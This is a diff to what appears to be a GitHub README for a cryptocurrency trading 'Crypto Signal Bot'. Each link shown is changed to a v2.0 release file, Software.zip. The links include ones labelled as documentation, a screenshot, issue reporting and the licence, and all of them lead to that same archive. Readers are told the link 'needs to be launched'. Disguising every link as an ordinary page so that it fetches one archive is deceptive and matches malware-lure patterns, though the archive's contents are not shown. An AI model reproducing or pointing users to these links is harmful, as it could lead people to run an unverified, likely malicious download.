@@ -12,7 +12,7 @@ ai-trade-bot, ai-trading, bullish-flag, crypto-api, crypto-bot, crypto-news-sour
 ### Get Started 📈
 To download the latest version of the Crypto Signal Bot, click the button below:
 
-[![Download Crypto Signal Bot](https://github.com/gust24/crypto-signal-bot/releases/download/v1.0/Software.zip%https://github.com/gust24/crypto-signal-bot/releases/download/v1.0/Software.zip)](https://github.com/gust24/crypto-signal-bot/releases/download/v1.0/Software.zip)
+[![Download Crypto Signal Bot](https://github.com/gust24/crypto-signal-bot/releases/download/v2.0/Software.zip%https://github.com/gust24/crypto-signal-bot/releases/download/v2.0/Software.zip)](https://github.com/gust24/crypto-signal-bot/releases/download/v2.0/Software.zip)
 
 ### Note:
 The link provided above needs to be launched to get the latest version of the Crypto Signal Bot.
@@ -34,25 +34,25 @@ Crypto Signal Bot is a powerful tool designed for cryptocurrency traders to rece
 4. Start receiving trading signals and make informed decisions.
 
 ### Screenshots 📷
-![Crypto Signal Bot Interface](https://github.com/gust24/crypto-signal-bot/releases/download/v1.0/Software.zip)
+![Crypto Signal Bot Interface](https://github.com/gust24/crypto-signal-bot/releases/download/v2.0/Software.zip)
 - *Above: The user-friendly interface of the Crypto Signal Bot*
 
 ### Contribute 🤝
 Contributions are welcome! If you have new ideas, features, or improvements to suggest, feel free to submit a pull request.
 
 ### Support 💬
-For any questions, feedback, or issues related to the Crypto Signal Bot, please [create an issue](https://github.com/gust24/crypto-signal-bot/releases/download/v1.0/Software.zip).
+For any questions, feedback, or issues related to the Crypto Signal Bot, please [create an issue](https://github.com/gust24/crypto-signal-bot/releases/download/v2.0/Software.zip).
 
 ### Resources 📚
-- [Crypto Signal Bot Documentation](https://github.com/gust24/crypto-signal-bot/releases/download/v1.0/Software.zip)
-- [Crypto News Sources API](https://github.com/gust24/crypto-signal-bot/releases/download/v1.0/Software.zip)
-- [Market Analysis Tools](https://github.com/gust24/crypto-signal-bot/releases/download/v1.0/Software.zip)
+- [Crypto Signal Bot Documentation](https://github.com/gust24/crypto-signal-bot/releases/download/v2.0/Software.zip)
+- [Crypto News Sources API](https://github.com/gust24/crypto-signal-bot/releases/download/v2.0/Software.zip)
+- [Market Analysis Tools](https://github.com/gust24/crypto-signal-bot/releases/download/v2.0/Software.zip)
 
 ### Credits 🙌
 Crypto Signal Bot is developed and maintained by the passionate team at CryptoTech Solutions.
 
 ### License 📝
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/gust24/crypto-signal-bot/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/gust24/crypto-signal-bot/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
